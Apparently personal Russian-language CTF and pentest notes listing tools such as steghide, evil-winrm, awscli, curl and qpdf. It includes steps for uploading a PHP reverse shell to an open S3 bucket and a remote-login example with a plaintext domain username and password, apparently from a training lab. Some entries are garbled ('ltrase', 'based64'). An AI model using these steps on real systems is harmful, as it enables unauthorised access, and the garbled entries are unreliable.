**`xdg-open`** - позволяет открыть файл ( например картинку ) или URL в предпочтительном для него окружении.
**`steghide`** - ищет закодированный текст в нетекстовых файлах ( например картинках )
> ``` 
> steghide --info image.jpg
> steghide extract -sf image.jpg
> ```

**`ltrase`** - читает бинарные файлы как cat 

## Удалённая авторизация
### evil-winrm
`evil-winrm` - подключиться к удаённому хосту windows. пример:

``` 
evil-winrm -i <ip> -u <username> -p <userpassword>
```
пример с windows:
```
evil-winrm -u 'CODEBY\dsemenov' -p '!!!!ilovegood17' -i 192.168.2.4
```
где `CODEBY\dsemenov` - {windows domain}\\{userdomain}

### [[Протоколы#SSH]]

### [[Протоколы#SMB]]

### [[Протоколы#RDP]]
### [[impacket]]
 
## WEB

### [[Responder]]

### AWS
Существует саб-домин - **s3**. Это облачное хранилище для вещей в контейнерах. Корзины **AWS S3** имеют различные сценарии использования, включая резервное копирование и хранение, хостинг мультимедиа, доставку программного обеспечения, статический веб-сайт и тд. Файлы, хранящиеся в корзине Amazon S3, называются объектами S3.
**`awscli`** позволяет взаимодействовать с этой корзиной.
```
aws configure # первоначальная настройка. Можно установить значения temp.
```
Мы можем перечислить все корзины S3, размещенные на сервере, с помощью команды ls:
```
aws --endpoint=http://s3.<url> s3 ls
```
Мы также можем использовать команду ls для перечисления объектов и общих префиксов в указанном бакете.
```
aws --endpoint=http://s3.<url> s3 ls s3://<url>
```
Далее можно создать файл и иньекцией:
```
php_reverse_shell > shell.php
```
и загрузить его на уязвимый сервер:
```
aws --endpoint=http://s3.<url> s3 cp shell.php s3://<url>
```
### WGET
чтобы скачать что-то на windows, необходимо использовать следующий синтаксис:
```
wget http://<IP/URL>/<file> -outfile <file>
```

### CURL
```
curl -sX POST <url> # чтобы сделать POST запрос 
```
```
curl <url> --data "..."
```
>`--data` - указывает post параметры 
>>пример для `...` : 
>>`admin=1&message=Hello` или json `{'admin':'1','message':'Hello'}`
## Encrypt
`based64 -d <text>` - перевести текст в based64 кодировку.

## PDF
Чтобы создать PDF файл и внедрить в него какие-то данные:
``` 
qpdf --empty --add-attachment <some file to implement> --mimetype=text/plain -- <name created file>
```
Извлечь ранее внедрённый в PDF файл:
```
binwalk -Me <file>
```
##### Открыть PDF
```
evince file.pdf
```

# ZIP
Чтобы открыть `zip` по `паролю` и` shasum-е`, при `sha-256` == `307744fa0ae574756157a4607e307492141fdf1f000f6289eab4a8741729469c`
```shell
echo -n "307744fa0ae574756157a4607e307492141fdf1f000f6289eab4a8741729469c  name.zip" | sha256sum -c
```
Подбор утилиты для открытия по паролю:
```shell
unzip -P "password" name.zip
```
```shell
7z x -ppassword name.zip
```

# Бинарные файлы

Проверить настройки бинарной безопасности:
``` 
checksec myFile
```

# Управление пакетами

[[Администрирование Linux#Управление пакетами]]